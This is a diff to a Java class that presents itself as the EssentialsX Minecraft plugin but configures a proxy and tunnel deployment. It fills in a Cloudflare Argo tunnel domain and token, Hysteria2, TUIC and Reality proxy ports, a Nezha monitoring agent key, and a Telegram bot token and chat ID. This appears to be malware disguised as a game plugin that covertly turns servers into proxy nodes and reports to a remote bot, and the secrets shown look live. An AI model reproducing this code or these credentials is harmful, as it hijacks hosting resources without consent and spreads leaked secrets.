@@ -79,20 +79,20 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "ihPw1Pwe7A2Kcxcc46pljwyZHLxBqYyD");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "xserver2.king8888.nyc.mn");
+        env.put("ARGO_AUTH", "eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiY2E0YzdiNGYtZDhlMy00Y2I4LThiMjItMGU4YTQxNWRmYjc4IiwicyI6Ik5EUmhZV1ZsTWprdE5HSXhZaTAwWlROaExUZzBZalF0WWpGbFl6STBPR0ZrT0RBNCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
+        env.put("HY2_PORT", "25565");
+        env.put("TUIC_PORT", "25575");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "25575");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
+        env.put("CHAT_ID", "5848244735");
+        env.put("BOT_TOKEN", "7799976927:AAHY1DDudQzUTdwkvTAZ8OAy2zHvULCtTX0");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "Xserver");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
